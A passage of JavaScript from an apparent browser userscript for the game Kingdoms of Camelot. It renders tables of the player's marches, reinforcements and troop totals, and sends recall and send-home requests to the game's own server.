		var tileNames = [''+culang.barbarians+'', ''+culang.grassland+'', ''+culang.rptlake+'', ''+culang.forests+'', ''+culang.rpthill+'', ''+culang.rptmount+'', ''+culang.rptplain+'', ''+culang.city+'', ''+culang.darkforest+'' ];
		var numtile=parseInt(tileType/10) + 1;
		if (tileType==10) numtile=1;
		if (tileType==11) numtile=2;
                if (tileType <= 50) { // TS
                  player = tileNames[numtile] +" "+culang.lvl+" " + tileLevel;
                  /*if (playerId==0) {
                   player += " - Libre";
                  } else {
                   player += " - " + who;
                  }*/  // BUG DU JEU !!! pfff
                }

                if (tileType == 51 && playerId == 0 && march.toTileLevel==9) { // Barbares
		  player = ""+culang.rptbarb+" "+culang.lvl+" " + tileLevel;
                }
				                if (tileType == 51 && playerId == 0 && march.toTileLevel==7) { // Ville
                  player = ""+culang.city+" "+culang.lvl+" " + tileLevel;
                }
                if (tileType == 54 && playerId == 0) { // Barbares
		     player = ""+culang.shrDF+" "+culang.lvl+" " + tileLevel;
                }
                var nomville="";
                if (playerId > 0 && tileType == 51) { // ville
                 if (march.marchType==1) {
                  for(i=0; i<Cities.numCities; i++) {
                   if (cityId==Cities.cities[i].id) {
                    nomville=Cities.cities[i].name
                     break;
                   }
                  }
                  player = '<i>'+culang.from+'</i> '+ nomville;
                 } else {
                  player = ''+culang.city+' '+culang.lvl+' ' + tileLevel;
                 }
                }
                var typeattack="?";
                if (march.marchType==3) typeattack=''+culang.scout+'';
                if (march.marchType==4) typeattack=''+culang.rptattack+'';
                if (march.marchType==10) typeattack=''+culang.rptattack+'';
                if (march.marchType==11) typeattack=''+culang.scout+'';
                if (march.marchType==1) typeattack=''+culang.transport+'';
                if (march.marchType==5) typeattack=''+culang.Mreassign+'';
                if (march.marchType==9) typeattack=''+culang.raitack+'';
                var now = new Date();
                var statusm = march.marchStatus;
                var Marchstatut="<span title='type : "+march.marchType+" "+culang.status+": "+statusm+"'>?</span> ";
                var arrivedans="0s";
                var arrivedanssec=0;
		if (statusm==1) { 
		 Marchstatut="";
		 if (march.marchType==3 || march.marchType==11) 
		  Marchstatut+='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/scouting.jpg" align=absmiddle>';
		 if (march.marchType==4 || march.marchType==10) 
		  Marchstatut+='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/attacking.jpg" align=absmiddle>';
		 if (march.marchType==9) 
		  Marchstatut+='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/attacking.jpg" align=absmiddle>';
		 if (march.marchType==1) 
		  Marchstatut+='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/transporting.jpg" align=absmiddle>';
                 if (march.marchType==5) 
                  Marchstatut+='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/reinforce.jpg" align=absmiddle>';
		  Marchstatut+="&nbsp;"+culang.march+""; 
		  arrivedans = unsafeWindow.timestr(parseInt(march.destinationUnixTime - unixTime()));
		  arrivedanssec = parseInt(march.destinationUnixTime - unixTime());
		}
                if (statusm==8) { 
                  Marchstatut = '<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/returning.jpg" align=absmiddle>&nbsp;'+culang.MTreturning+'';
                  arrivedans = unsafeWindow.timestr(march.returnUnixTime - unixTime());
                  arrivedanssec = parseInt(march.returnUnixTime - unixTime());
                }
                if (statusm==2) { 
                   Marchstatut='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/reinforce.jpg" align=absmiddle>&nbsp;'+culang.MTcamped+'';
                }
                if (statusm==5) { 
                   Marchstatut='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/reinforce.jpg" align=absmiddle>&nbsp;'+culang.MTwaitrpt+'';
                }
                if (statusm==4) { 
		   Marchstatut='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/autoAttack/raid_resting.png" align=absmiddle>&nbsp;'+culang.MTraidreset+'';
                }
                 if (statusm==3 || statusm==10 ) {  
		  Marchstatut='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/autoAttack/raid_stopped_desat.png" align=absmiddle>&nbsp;'+culang.MTraidstopped+'';
		}
 
                s += '<TR align=left><td align=left width=10%>';
                if (march.marchType!=9 && statusm==1 && arrivedanssec>60) s +='<A title="'+culang.sendhomeTitle+'" onclick="pr58Recall('+ mid+','+Cities.cities[c].id+')" ><SPAN><img  alt="'+culang.sendhome2+'" src="http://cdn1.iconfinder.com/data/icons/musthave/16/Remove.png" border=0 ></span></a>';
                if (march.marchType!=9 && statusm==2) s +='<A title="'+culang.sendhomeTitle+'" onclick="attack_recall('+ mid+', 1, '+Cities.cities[c].id+');" ><span><img  alt="'+culang.sendhome2+'" src="http://cdn1.iconfinder.com/data/icons/musthave/16/Remove.png" border=0 ></span></a>';
                if (march.marchType==9 && statusm==10 && arrivedanssec<=0) s +='<A title="'+culang.deleteb+'" onclick="raid_delete('+ mid+','+Cities.cities[c].id+');return false;"><span><img  alt="'+culang.shrdel+'" src="http://cdn1.iconfinder.com/data/icons/musthave/16/Remove.png" border=0 ></span></a>';
             
             s +='</td><td align=left width=10%>'+typeattack+'</td><td>'+arrivedans+'</td><td align=left width=15%>' + Marchstatut +'</td>\
                <TD align=left width=15%>' + player + '</td><td>'+pdxkoordlink(march.toXCoord,march.toYCoord)+'</td><td>' + knight +' </td><td colspan=12>'
				for (i=1; i<13; i++) {
	                  if (statusm==8) { 
	                    if (parseInt (march['unit'+ i +'Return']) > 0) {
	      	           s += names[i-1]+" :" + parseInt (march['unit'+ i +'Return']) + "<br>";
	      	          tot[i] += parseInt (march['unit'+ i +'Return']);
	                  }
	                  
	                  } else {
	                   if (parseInt (march['unit'+ i +'Count']) > 0) {
	                       s += names[i-1]+" :" + parseInt (march['unit'+ i +'Count']) + "<br>";
	                       tot[i] += parseInt (march['unit'+ i +'Count']);
	                   }
	                  }
                }
	      
                s += '</td><td style="font-size:11px">';
		//if (statusm==8) { // seulement le retour pour les barbares
		// s += 'Or : ' + addCommas(parseInt (march['gold'])) + '<br>'+unsafeWindow.g_js_strings.commonstr.food+' : ' + addCommas(march['resource1']) + '<br>Bois : ' + addCommas(march['resource2']) + '<br>Pierre : ' + addCommas(march['resource3']) + '<br>Minerais : ' + addCommas(march['resource4']) + '</td>';         
      		//} else {
      		if (march.marchType!=9) {
      		  s += '<a  class=button20 title="'+culang.showDetails+'" onclick="view_march('+ mid+');return false;"; ><span>'+culang.shrdetails+'</psan></a></td>';
      		  }else {
      		  s+='</td>';
      		  }
      		//}
                s += '</tr>';
                 // Details Button: <td><a  class=button20 onclick="view_march('+ mid+');return false;";><span>Detail</psan></a></td>
              }// MarchType !=2 (Reinforce)
            }   
            
        
	
	//} else {
	//   s= '<br>Aucune marche en cours...';
        } 
      } 
      s += '<TR><TD colspan=20><BR><BR></td></tr></table><TABLE cellspacing=0 cellpadding=2 width=100%><tr><td colspan=1></td>';
     	 for (k=0; k<names.length; k++)
     	 	s += '<TD width=7% align=center><B>' + names[k] + '</b></td>';
     	 s += '</tr>';
     	 s += '<TR align=center><TD class="tot" align=left width=10%><B>'+culang.Htotal+'</b></td>';
     	 for (i=1; i<13; i++)
     		s+= '<TD class="tot">'+ tot[i] +'</td>';
     	 s += '<td></td></tr></table>';
	 s += '<BR><BR><DIV style="font-size: 10px"></div>';
            
  } else { 
      
      
   var que = Seed.queue_atkp['city'+ Cities.cities[c].id];
   if (matTypeof(que)=='object') {      
			var a=0;
			for (k in que){
	                   march = que[k]; 
	                   
	              if ((march.marchType!=2 && !Options.voirRaid) || (march.marchType!=9 && march.marchType!=2 && Options.voirRaid) ) {
                  a++;
	                   if (a==1) {
	         	             //s+= '<TR><TD class=xtab><BR></td></tr>';
	         	             var cityID = 'city'+ Cities.cities[c].id;
	         	             var slots=0;
	   		     for(var z in Seed.queue_atkp[cityID])
	   		     	slots++;
	   	      	             
				var niveauPointRall=parseInt(getCityBuilding (Cities.cities[c].id, 12).maxLevel);
						if (niveauPointRall==12) niveauPointRall=11;
	         	  	     s+= '<TR><TD class="city">'+culang.shrrp+': '+slots+'/ '+niveauPointRall+'</td><TD class="city" colspan=17 align=center><font size=3><B><i><u>'+culang.holyplace+' ' + (parseInt(c)+1) + ' - '+ Cities.cities[c].name +'</b></td></tr>';
	         	        }
	                   var mid = k.substr(1);
	                   knight = '';
	                   //if (parseInt(march.knightCombat)>0) knight=' ('+ march.knightCombat +')';
	                    if (Seed.queue_atkp['city'+ Cities.cities[c].id][k]["knightId"] !=0){
	   		  				    	for (i in Seed.knights['city'+ Cities.cities[c].id]) {
	   		  				    			if (i == ("knt" + Seed.queue_atkp['city'+ Cities.cities[c].id][k]["knightId"]) ) knight = '&nbsp;('+culang.knights+': ' +Seed.knights['city'+ Cities.cities[c].id][i]["combat"] +')';
	   		  				    	}
	     				    } else knight = '';
	                  var playerId = march.toPlayerId;
			                 if (playerId==undefined) playerId=0;
			                 var cityId = march.toCityId;
			                 var tileType = parseInt(march.toTileType);
			                 var tileLevel = march.toTileLevel;
			                 var who = ''+culang.botStatUnknown+'';
			                 if (Seed.players['u' + playerId]) {
			 		 who = Seed.players['u' + playerId].n;
			 		}
			 		if (march.marchType==1) {
			 		  var player = "<span>"+culang.city+" "+culang.lvl+" "+ tileLevel +"</span>";
			 		}else {
			 		  var player = "<span title='"+culang.needRefresh+"'>"+culang.rptbarb+" "+culang.lvl+" "+ tileLevel +"</span>";
			 		}
			 		if (march.marchType==10 || march.marchType==11) { 
			 		  var player = "<span>"+culang.darkforest+" "+culang.lvl+" "+ tileLevel +"</span>";
			 		}
					var tileNames = [''+culang.barbarians+'', ''+culang.grassland+'', ''+culang.rptlake+'', ''+culang.forests+'', ''+culang.rpthill+'', ''+culang.rptmount+'', ''+culang.rptplain+'', ''+culang.city+'', ''+culang.darkforest+'' ];
			 		var numtile=parseInt(tileType/10) + 1;
			 		if (tileType==10) numtile=1;
			 		if (tileType==11) numtile=2;
			                 if (tileType <= 50) { // TS
			                   player = tileNames[numtile] +" "+culang.lvl+" " + tileLevel;
			                   /*if (playerId==0) {
			                    player += " - Libre";
			                   } else {
			                    player += " - " + who;
			                   }*/ 
			                 }

			                 if (tileType == 51 && playerId == 0 && march.toTileLevel==9) { // Barbares
							player = ""+culang.rptbarb+" "+culang.lvl+" " + tileLevel;
			                 }
							if (tileType == 51 && playerId == 0 && march.toTileLevel==7) { // Ville
			                   player = ""+culang.city+" "+culang.lvl+" " + tileLevel;
			                 }
			                 if (tileType == 54 && playerId == 0) { // Barbares
							player = ""+culang.shrDF+" "+culang.lvl+" " + tileLevel;
			                 }
			                 var nomville="";
			                 if (playerId > 0 && tileType == 51) { // ville
			                  if (march.marchType==1) {
			                   for(i=0; i<Cities.numCities; i++) {
			                    if (cityId==Cities.cities[i].id) {
			                     nomville=Cities.cities[i].name
			                      break;
			                    }
			                   }
			                   player = ''+culang.city+' '+ nomville;
			                  } else {
			                   player = ''+culang.city+' '+culang.lvl+' ' + tileLevel;
			                  }
			                 }
                var typeattack="?";
				if (march.marchType==3) typeattack=''+culang.scout+'';
				if (march.marchType==4) typeattack=''+culang.rptattack+'';
				if (march.marchType==10) typeattack=''+culang.rptattack+'';
				if (march.marchType==11) typeattack=''+culang.scout+'';
				if (march.marchType==1) typeattack=''+culang.transport+'';
				if (march.marchType==5) typeattack=''+culang.Mreassign+'';
				if (march.marchType==9) typeattack=''+culang.raitack+'';
				var now = new Date();
                var statusm = march.marchStatus;
                var Marchstatut="<span title='type : "+march.marchType+" "+culang.status+": "+statusm+"'>?</span> ";
                var arrivedans="0s";
                var arrivedanssec=0;
		if (statusm==1) { 
		 Marchstatut="";
		 if (march.marchType==3 || march.marchType==11) 
		  Marchstatut+='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/scouting.jpg" align=absmiddle>';
		 if (march.marchType==4 || march.marchType==10) 
		  Marchstatut+='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/attacking.jpg" align=absmiddle>';
		 if (march.marchType==9) 
		  Marchstatut+='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/attacking.jpg" align=absmiddle>';
		 if (march.marchType==1) 
		  Marchstatut+='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/transporting.jpg" align=absmiddle>';
                 if (march.marchType==5) 
                  Marchstatut+='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/reinforce.jpg" align=absmiddle>';
		  Marchstatut+="&nbsp;"+culang.march+""; 
		  arrivedans = unsafeWindow.timestr(parseInt(march.destinationUnixTime - unixTime()));
		  arrivedanssec = parseInt(march.destinationUnixTime - unixTime());
		}
                if (statusm==8) { 
                  Marchstatut = '<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/returning.jpg" align=absmiddle>&nbsp;'+culang.MTreturning+'';
                  arrivedans = unsafeWindow.timestr(march.returnUnixTime - unixTime());
                  arrivedanssec = parseInt(march.returnUnixTime - unixTime());
                }
                if (statusm==2) { 
                   Marchstatut='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/reinforce.jpg" align=absmiddle>&nbsp;'+culang.MTcamped+'';
                }
                if (statusm==5) { 
                   Marchstatut='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/reinforce.jpg" align=absmiddle>&nbsp;'+culang.MTwaitrpt+'';
                }
                if (statusm==4) { 
		   Marchstatut='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/autoAttack/raid_resting.png" align=absmiddle>&nbsp;'+culang.MTraidreset+'';
                }
                if (statusm==3 || statusm==10) {  
		  Marchstatut='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/autoAttack/raid_stopped_desat.png" align=absmiddle>&nbsp;'+culang.MTraidstopped+'';
		}
 
                s += '<TR align=left><td align=left width=10%>';
                if (march.marchType!=9 && statusm==1 && arrivedanssec>60) s +='<A  title="'+culang.sendhomeTitle+'" onclick="pr58Recall('+ mid+','+Cities.cities[c].id+')"><SPAN><img  alt="'+culang.sendhome2+'" src="http://cdn1.iconfinder.com/data/icons/musthave/16/Remove.png" border=0 ></span></a>';
                if (march.marchType!=9 && statusm==2) s +='<A  title="'+culang.sendhomeTitle+'" onclick="attack_recall('+ mid+', 1, '+Cities.cities[c].id+');" ><span><img  alt="'+culang.sendhome2+'" src="http://cdn1.iconfinder.com/data/icons/musthave/16/Remove.png" border=0 ></span></a>';
                if (march.marchType==9 && statusm==10 && arrivedanssec<=0) s +='<A title="'+culang.deleteb+'" onclick="raid_delete('+ mid+','+Cities.cities[c].id+');return false;"><span><img alt="'+culang.shrdel+'" src="http://cdn1.iconfinder.com/data/icons/musthave/16/Remove.png" border=0 ></span></a>';
               s +='</td><td align=left width=10%>'+typeattack+'</td><td>'+arrivedans+'</td><td align=left width=15%>' + Marchstatut +'</td>\
	                      <TD align=left width=15%>' + player + '</td><td>'+pdxkoordlink(march.toXCoord,march.toYCoord)+'</td><td>' + knight +' </td><td colspan=12>'
	      	       for (i=1; i<13; i++) {
	      	                  if (statusm==8) { 
	      	                    if (parseInt (march['unit'+ i +'Return']) > 0) {
	      	      	           s += names[i-1]+" :" + parseInt (march['unit'+ i +'Return']) + "<br>";
	      	      	          tot[i] += parseInt (march['unit'+ i +'Return']);
	      	                  }
	      	                  
	      	                  } else {
	      	                   if (parseInt (march['unit'+ i +'Count']) > 0) {
	      	                       s += names[i-1]+" :" + parseInt (march['unit'+ i +'Count']) + "<br>";
	      	                       tot[i] += parseInt (march['unit'+ i +'Count']);
	      	                   }
	      	                  }
	                      }
	      	      
	                      s += '</td><td style="font-size:11px">';
	            		if (march.marchType!=9) {
	            		  s += '<a  class=button20 title="'+culang.showDetails+'" onclick="view_march('+ mid+');return false;";><span>'+culang.shrdetails+'</psan></a></td>';
	            		  }else {
	            		  s+='</td>';
	            		  }
                s += '</tr>';
	        }
     } 
     s += '<TR><TD colspan=18><BR><BR></td></tr></table><TABLE cellspacing=0 cellpadding=2 width=100%><tr><td colspan=1></td>';
     for (k=0; k<names.length; k++)  s += '<TD width=7% align=center><B>' + names[k] + '</b></td>';
     s += '</tr>';
     s += '<TR align=center><TD class="tot" align=left width=10%><B>'+culang.Htotal+'</b></td>';
     for (i=1; i<13; i++) s+= '<TD class="tot">'+ tot[i] +'</td>';
     s += '<td></td></tr></table>';
     s += '<BR><BR><DIV style="font-size: 10px"></div>';
    } else {
     s= '<br><center><b>'+culang.nomarches+'</b></center>';
    } 
   } 
   document.getElementById('showMarchDiv').innerHTML = s;
   t.displayTimer = setTimeout (function() { t.showMarches(numville);   }, 1000);
  },
  ajaxDeleteRaid: function(marchId, cityId) {
      var villeencours=cityId;
               var march = Seed.queue_atkp["city" + villeencours]["m" + marchId];
               if (march == null){
                 alert("Marche non trouve");
                 return;
               }    
               var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
               params.action="deleteMarch";
               params.marchId = marchId;
			   params.ctrl="BotManager";
			   params.settings={cityId:villeencours}; 
			   unsafeWindow.ajax.Request(unsafeWindow.g_ajaxpath+"ajax/_dispatch.php"+unsafeWindow.g_ajaxsuffix,{method:"post",parameters:params,loading:true,
		onSuccess:function(transport) {
		  var m = eval("(" + transport.responseText + ")");
		   if (m.ok){        
            var j=marchId;
            var t=cityId;
            var n=Seed.units["city"+t];
            for(var o=0;o<13;++o){
             if (m["unit"+o+"Return"]) {
              var p=parseInt(m["unit"+o+"Return"]);
              if(!isNaN(p)&&(p>0)){
               n["unt"+o]=parseInt(n["unt"+o])+p;
               }
             }
            }
            unsafeWindow.cityinfo_army();
            var s="city"+t;
            // recherche de mon chevalier
            var mymarch = unsafeWindow.seed.queue_atkp["city" + t]["m" + j];
            var kngId= mymarch.knightId;
            delete Seed.queue_atkp[s]["m"+j];
            if(unsafeWindow.Object.keys(Seed.queue_atkp[s]).length==0){
              Seed.queue_atkp[s]=[];
            }
            Seed.knights["city"+t]["knt"+kngId].knightStatus=1;          
     } else {

       
     }
    }, onFailure: function () {
       
    },
   });

  },
/**********************************************************/
/************ KOC POWER - SUBTABS REINFORCEMENTS *********/
/********************************************************/
  showReinforcementsOut : function (){
      var rownum = 0;
	  var names = [''+culang.shrsupply+'', ''+culang.shrmilitiaman+'', ''+culang.scout+'', ''+culang.shrpikeman+'', ''+culang.shrswordsman+'', ''+culang.shrtarcher+'', ''+culang.shrcavalry+'', ''+culang.shrheavycavalry+'', ''+culang.shrsupplywagon+'', ''+culang.shrballista+'', ''+culang.shrbatteringram+'', ''+culang.shrcatapult+''];
      var t = Tabs.Marches;
      clearTimeout (t.displayTimer);
      var s = '<div class=pdxStat>'+culang.HTMrein+'</div>';
      s += '<STYLE> .tot{background:#f0e0f8;} .city{background:#ffffaa;}</style>';
      s += '<TABLE cellspacing=0 cellpadding=2 width=100%>';
      tot = [];
      for (i=0; i<13; i++)
        tot[i] = 0;
        
      for (var c=0; c<Cities.numCities; c++){
        var que = Seed.queue_atkp['city'+ Cities.cities[c].id];
        if (matTypeof(que)=='array')
          continue;

        var a=0;
        for (k in que){
          march = que[k]; 
          if (march.marchType==2) { 
          a++;
          if (a==1) {
	   s+= '<TR><TD class="city" colspan=16 align=left><B>'+culang.city+' ' + (parseInt(c)+1) + ' : '+ Cities.cities[c].name +'</b></td></tr>';
          }
          var mid = k.substr(1);
          knight = '';
	  if (Seed.queue_atkp['city'+ Cities.cities[c].id][k]["knightId"] !=0){
	  		  for (i in Seed.knights['city'+ Cities.cities[c].id]) {
	  		    if (i == ("knt" + Seed.queue_atkp['city'+ Cities.cities[c].id][k]["knightId"]) ) knight = '' +Seed.knights['city'+ Cities.cities[c].id][i]["combat"] +'';
	  		  }
  	  } else knight = '';
          if (parseInt(march.knightCombat)>0) knight=' ('+ march.knightCombat +')';
	  try {
	     player = Seed.players['u'+march.toPlayerId].n; //Seed.players['u'+k].n;
	   } catch (err){
	     player = ''+culang.botStatUnknown+'';
          }
        
          s += '<TR align=left><td align=left width=12%>';
          var statusm = march.marchStatus;
          var Marchstatut='';
          var arrivedans="0s";
          var arrivedanssec=0;
          if (statusm==1) { 
            Marchstatut='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/reinforce.jpg" align=absmiddle>&nbsp;'+culang.march+'';
            arrivedans = unsafeWindow.timestr(parseInt(march.destinationUnixTime - unixTime()));
            arrivedanssec = parseInt(march.destinationUnixTime - unixTime());
          }
          if (statusm==2) { 
            Marchstatut='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/reinforce.jpg" align=absmiddle>&nbsp;'+culang.MTcamped+'';
          }
          if (statusm==8) { 
            Marchstatut='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/returning.jpg" align=absmiddle>&nbsp;'+culang.MTreturning+'';
            arrivedans = unsafeWindow.timestr(parseInt(march.returnUnixTime - unixTime())); 
            arrivedanssec = parseInt(march.returnUnixTime - unixTime());
          }
          if (statusm==5) { 
           Marchstatut='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/reinforce.jpg" align=absmiddle>&nbsp;'+culang.MTwaitrpt+'';
          }
          if (statusm==1 && arrivedanssec>60){
            s +='<A title="'+culang.sendhomeTitle+'" onclick="pr58Recall('+ mid+','+Cities.cities[c].id+')" ><SPAN><img  alt="'+culang.sendhome2+'" src="http://cdn1.iconfinder.com/data/icons/musthave/16/Remove.png" border=0 ></span></a>';
          }
          if (statusm==2) { 
             s +='<A title="'+culang.sendhomeTitle+'" onclick="pr57Recall('+ mid+')" ><SPAN><img  alt="'+culang.sendhome2+'" src="http://cdn1.iconfinder.com/data/icons/musthave/16/Remove.png" border=0 ></span></a>';
          } else {
            s += '&nbsp;';
          }

          s+='</td><td align=left width=15%>'+Marchstatut+'</td><td>'+arrivedans+'</td><TD align=left width=30%>' + player + ' '+pdxkoordlink(march.toXCoord,march.toYCoord)+'&nbsp;' + knight +' </td><td colspan=12>'
          for (i=1; i<13; i++) {
            if (statusm==8) { 
              if (parseInt (march['unit'+ i +'Return']) > 0) {
	          s += " " + parseInt (march['unit'+ i +'Return']) + " "+names[i-1]+"<br>";
	          tot[i] += parseInt (march['unit'+ i +'Return']);
            }
            
            } else {
             if (parseInt (march['unit'+ i +'Count']) > 0) {
                s += " " + parseInt (march['unit'+ i +'Count']) + " "+names[i-1]+"<br>";
                tot[i] += parseInt (march['unit'+ i +'Count']);
             }
            }
          }
          s += '</td></tr>';
          }
        }      
      } 
      
       s += '<TR><TD colspan=16><BR><BR></td></tr></table><TABLE cellspacing=0 cellpadding=2 width=100%><tr><td colspan=1></td>';
            for (k=0; k<names.length; k++)
              s += '<TD width=7% align=center><B>' + names[k] + '</b></td>';
            s += '</tr>';
            s += '<TR align=center><TD class="tot" align=left width=10%><B>'+culang.Htotal+'</b></td>';
            for (i=1; i<13; i++)
              s+= '<TD class="tot">'+ tot[i] +'</td>';
      s += '</tr></table>';
      t.marchDiv.innerHTML = s;
      t.displayTimer = setTimeout (t.showReinforcementsOut, 1000);
      return;
  },
     
  showReinforcements : function (){
   var rownum = 0;
	var names = [''+culang.shrsupply+'', ''+culang.shrmilitiaman+'', ''+culang.scout+'', ''+culang.shrpikeman+'', ''+culang.shrswordsman+'', ''+culang.shrtarcher+'', ''+culang.shrcavalry+'', ''+culang.shrheavycavalry+'', ''+culang.shrsupplywagon+'', ''+culang.shrballista+'', ''+culang.shrbatteringram+'', ''+culang.shrcatapult+''];
    var t = Tabs.Marches;
    clearTimeout (t.displayTimer);
      
    function clickShowRemaining (){
      checkBox = document.getElementById('idCheck2');
      if (checkBox.checked)
        Options.encRemaining = false;
      else
        Options.encRemaining = true;
      t.show2 ();
    }
  
    enc = {};
    numSlots = 0;
    
    if (matTypeof(Seed.queue_atkinc) != 'array'){
      for (k in Seed.queue_atkinc){
        march = Seed.queue_atkinc[k];
        if (march.marchType == 2){
          ++numSlots;
          city = march.toCityId;
          from = march.fromPlayerId;
          if (!enc[city])
            enc[city] = {};
          if (!enc[city][from])
            enc[city][from] = [];
          s = {};
          s.knight = parseInt (march.knightCombat);
          s.marchId = k.substr(1);
          s.fromXCoord = march.fromXCoord;
          s.fromYCoord = march.fromYCoord;
          s.troops = [];
          for (i=1; i<13; i++){
            if (Options.encRemaining)
              s.troops[i] = parseInt (march['unit'+ i +'Return']);
            else
              s.troops[i] = parseInt (march['unit'+ i +'Count']);
          }
          enc[city][from].push (s);
        }
      }
    }
    s = '<div class=pdxStat>'+culang.HTMemb+'</div>';
    if (numSlots == 0){
      s += '<BR><CENTER><B>'+culang.MTnodefforu+'</b></center>';
    } else {
      s += '<STYLE> .tot{background:#f0e0f8;} .city{background:#ffffaa;} .entete{background:#efa9a9;}</style>';
      s += '<TABLE cellspacing=0 cellpadding=2 width=100%>\
      <tr><td class="entete">'+culang.action+'</td><td class="entete">'+culang.coord+'</td><td class="entete">'+culang.player+'</td><td class="entete">'+culang.knights+'</td><td colspan=12 class="entete">'+culang.troops+'</td><td class="entete">'+culang.usage+'</td></tr>';
 
      tot = [];
      totent= 0;
      for (i=0; i<13; i++) {
        tot[i] = 0;
        
      }
      for (c in Cities.cities){
        dest = Cities.cities[c].id;
        if (enc[dest]){
          s+= '<TR><TD class="city" colspan=17 align=left><B>'+culang.city+' ' + (parseInt(c)+1) + ' : '+ Cities.cities[c].name +'</b></td></tr>';
          for (p in enc[dest]){
            try {
              player = Seed.players['u'+p].n;
            } catch (err){
              player = '???';
            }
            for (m=0; m<enc[dest][p].length; m++){
              var march = enc[dest][p][m];
              knight = '';
              if (march.knight > 0)
                knight = ' '+ march.knight +'';
// TODO: Only allow 'send home' if troops are here now  (marchStatus = ?)              
              s += '<TR align=left><td align=left width=12%><A  title="'+culang.sendhomeTitle+'" onclick="r8x6Home('+ march.marchId +')"><SPAN><img  alt="'+culang.sendhome2+'" src="http://cdn1.iconfinder.com/data/icons/musthave/16/Remove.png" border=0 ></span></a></td>\
              <TD align=left>'+pdxkoordlink(march.fromXCoord,march.fromYCoord)+'</td>\
              <TD align=left width=25%>'+ player +' </td><td align=left>'+ knight+'</td><td colspan=12>'
              var g=0;
              for (i=1; i<13; i++){
               if (march.troops[i] > 0) {
                s += ''+ march.troops[i]  +' '+ names[i-1]  +'<br>';
               }
               tot[i] += march.troops[i];
               g+=parseInt(march.troops[i])*parseInt(unsafeWindow.unitupkeeps[i]);
               
              }
              totent += g;
              s += '</td><td>';
              s += addCommas(g) + '</td></tr>';
            }
          }
        }
      }
      s += '<TR><TD colspan=17><BR><BR></td></tr></table><TABLE cellspacing=0 cellpadding=2 width=100%><tr><td colspan=1></td>';
      for (k=0; k<names.length; k++)
        s += '<TD width=7% align=center><B>' + names[k] + '</b></td>';
      s += '</tr>';
      s += '<TR align=center><TD class="tot" align=left width=10% rowspan=2><B>'+culang.Htotal+'</b></td>';
      for (i=1; i<13; i++)
        s+= '<TD class="tot">'+ tot[i] +'</td>';
      s += '</tr><td colspan=12>'+culang.foodusagetot+' '+addCommas(totent)+' '+culang.foodusagetot2+'</td></table>';
    }

    s += '<BR><BR><INPUT type=CHECKBOX id=idCheck2 '+ (Options.encRemaining?'':' CHECKED ') +'> '+culang.showOrginal+'';
    s += '<BR><BR><DIV style="font-size: 10px"><u><b>'+culang.impnote+'</b></u>: '+culang.Embnote+'!</div>';
    t.marchDiv.innerHTML = s;
    checkBox = document.getElementById('idCheck2');
    checkBox.addEventListener('click', clickShowRemaining, false);
    t.displayTimer = setTimeout (t.show2, 10000);
  },
  butSendHome : function (marchId){
        var t = Tabs.Marches;
        t.ajaxSendHome (marchId); 
   },
     counts:[],
  getMarchCount : function (cityNum) {
    var t = Tabs.Marches;
    for(var i=0; i<Cities.numCities; i++) {   
      cityId = 'city'+ Cities.cities[i].id;
      t.counts[i] = 0;
      for (var k in Seed.queue_atkp[cityId]){   
        march = Seed.queue_atkp[cityId][k];
        if (typeof (march) == 'object'){
          t.counts[i]++;
        }
      }
    }
    return t.counts[cityNum];
   },
   ajaxSendHome : function (marchId, notify){ 
     var march = Seed.queue_atkinc['m'+ marchId];
     if (march == null){
       notify (''+culang.marchnotfound+''); 
       return;
     }    
     var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
     params.mid = marchId;
     params.cid = march.toCityId;
     params.fromUid = march.fromPlayerId;
     params.fromCid = march.fromCityId;
     new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/kickoutReinforcements.php" + unsafeWindow.g_ajaxsuffix, {
         method: "post",
         parameters: params,
         onSuccess: function (rslt) {
           if (rslt.ok){
             var upkeep = 0;
             for (var i=1; i<13; i++)
               upkeep += parseInt(march["unit" + i + "Return"]) * parseInt(unsafeWindow.unitupkeeps[i]);
             unsafeWindow.seed.resources["city"+ march.toCityId].rec1[3] -= upkeep;
             if (parseInt(march.fromPlayerId) == parseInt(unsafeWindow.tvuid)) {
               var mymarch = unsafeWindow.seed.queue_atkp["city" + march.fromCityId]["m" + marchId];
               var marchtime = Math.abs(parseInt(mymarch.destinationUnixTime) - parseInt(mymarch.eventUnixTime));
               mymarch.returnUnixTime = unixTime() + marchtime;
               mymarch.marchStatus = 8;
             }
             delete unsafeWindow.seed.queue_atkinc["m" + marchId];
             if (notify != null)
               notify(null);
           } else {
             if (notify != null)
               notify(rslt.errorMsg);
           }
         },
         onFailure: function () {
           if (notify != null)
             notify(rslt.errorMsg);
         },
     });
  },
  butRecall2 : function (marchId){
     var t = Tabs.Marches;
     t.ajaxRecall2 (marchId); 
  },
  ajaxRecall2 : function (marchId, notify){

      var villeencours;
          for (var c=0; c<Cities.numCities; c++){
            var que = Seed.queue_atkp['city'+ Cities.cities[c].id];
            if (matTypeof(que)=='array')
              continue;
            for (k in que){
              if (k == 'm'+marchId){
